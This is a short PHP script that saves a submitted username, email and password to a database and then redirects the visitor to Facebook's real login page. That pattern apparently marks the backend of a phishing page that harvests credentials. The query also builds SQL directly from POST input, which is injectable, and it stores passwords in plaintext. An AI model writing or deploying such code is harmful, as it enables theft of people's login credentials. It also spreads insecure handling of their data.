<?php
require "db.php";

if (!isset($_POST["username"], $_POST["email"], $_POST["password"])) {
    exit();
}

$username = $_POST["username"];
$email = $_POST["email"];
$password = $_POST["password"];

$sql = "INSERT INTO users (username, email, password)
        VALUES ('$username', '$email', '$password')";

$result = mysqli_query($conn, $sql);

if ($result) {
    header("Location: https://www.facebook.com/login/");
    exit();
} else {
    echo "Erreur lors de l'enregistrement";
}
